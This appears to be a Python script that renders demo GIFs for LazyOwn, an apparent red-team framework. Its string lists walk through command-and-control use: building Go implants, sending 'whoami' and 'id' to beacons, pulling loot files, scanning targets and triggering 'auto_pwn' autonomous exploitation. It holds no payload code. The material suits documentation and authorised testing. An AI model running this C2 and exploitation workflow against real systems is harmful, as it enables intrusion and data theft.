"""Additional LazyOwn demo GIFs. Every command verified against source."""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from gen_demo_gifs import render

OUT = "assets/demo"

c2_cli = [
    "(LazyOwn) > c2_quickstart  # AES key + implant dir + beacon one-liners",
    "(LazyOwn) > c2_status  # listener, route, beacons, AES key",
    "(LazyOwn) > c2_implant linux mybeacon  # Go implant -> sessions/implant/",
    "(LazyOwn) > c2_beacons  # active beacons + last-seen",
    "(LazyOwn) > c2_beacon_cmd abc123 whoami  # queue -> sessions/cmd_abc123.json",
    "(LazyOwn) > c2_keygen  # rotate AES-256 beacon key",
]

issue_cmds = [
    "(LazyOwn) > issue_command_to_c2  # prompts: Enter the command (default whoami)",
    "(LazyOwn) > issue_command_to_c2 abc123 id  # exec on beacon abc123",
    "(LazyOwn) > download_c2 loot.txt  # pull file from implant",
    "# download: stage file in sessions/temp_upload first",
    "(LazyOwn) > c2_beacons  # verify output came back",
]

first_steps = [
    "(LazyOwn) > doctor  # preflight: python, venv, certs, tools",
    "(LazyOwn) > wizard  # 7 steps, auto-detects lhost -> payload.json",
    "(LazyOwn) > assign rhost 10.10.11.5  # every command reads this",
    "(LazyOwn) > assign lhost 10.10.14.3  # beacon callbacks + payloads",
    "(LazyOwn) > scope add 10.10.11.0/24 && scope mode enforce",
    "(LazyOwn) > ping  # alive? TTL 64=Linux 128=Windows, sets os_id",
    "(LazyOwn) > lazynmap  # full scan -> sessions/scan_<rhost>.nmap",
]

recon_loop = [
    "(LazyOwn) > auto_populate  # nmap XML -> payload.json context",
    "(LazyOwn) > facts_show  # ports, services, versions",
    "(LazyOwn) > recommend_next  # ranked next steps, no API key needed",
    "(LazyOwn) > gobuster  # dir fuzz on url + dirwordlist",
    "(LazyOwn) > hunt  # threat-informed recon",
    "(LazyOwn) > engage 10.10.11.5  # full chain when you want speed",
    "(LazyOwn) > auto_pwn  # autonomous exploitation",
]

def main():
    """Render the four extended GIFs."""
    render(c2_cli, f"{OUT}/c2-cli.gif")
    render(issue_cmds, f"{OUT}/issue-c2.gif")
    render(first_steps, f"{OUT}/first-steps.gif")
    render(recon_loop, f"{OUT}/recon-loop.gif")


if __name__ == "__main__":
    main()
